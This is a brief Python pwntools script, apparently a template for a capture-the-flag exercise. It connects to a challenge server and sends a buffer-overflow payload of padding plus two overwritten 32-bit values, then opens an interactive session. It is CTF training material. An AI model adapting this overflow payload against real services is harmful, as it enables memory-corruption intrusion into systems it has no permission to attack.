from pwn import *

conn = remote('chal.sigpwny.com', 1352)

conn.recvline()

exploit = b'A' * 0x10
exploit += p32(0x12345678) # dont change this
exploit += p32(0x87654321) # change this

conn.sendline(exploit)

conn.interactive()